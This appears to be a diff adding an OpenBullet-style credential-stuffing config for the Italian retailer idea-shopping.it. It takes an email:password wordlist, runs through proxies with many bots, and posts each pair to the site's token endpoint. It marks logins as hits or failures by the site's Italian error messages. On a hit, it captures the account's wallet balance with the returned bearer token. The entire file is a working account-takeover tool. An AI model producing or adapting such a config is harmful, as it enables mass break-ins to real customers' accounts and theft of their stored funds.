@@ -1,0 +1,46 @@
+[SETTINGS]
+{
+  "Name": "Idea Shopping (IT)",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-06T13:02:44.0579046+00:00",
+  "AdditionalInfo": "",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#LOGIN REQUEST POST "https://www.idea-shopping.it/services/token" AutoRedirect=TRUE 
+  CONTENT "grant_type=password&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "E-mail o password errati." 
+    KEY "L'E-mail non è stata ancora confermata" 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+#PARSE_TOKEN PARSE "<SOURCE>" JSON "access_token" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#GET_WALLET_BALANCE REQUEST GET "https://www.idea-shopping.it/services/api/Wallet/GetWalletBalance" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+#CAPTURE_BALANCE PARSE "<SOURCE>" LR "" "" Recursive=FALSE -> CAP "Balance" "" "" 
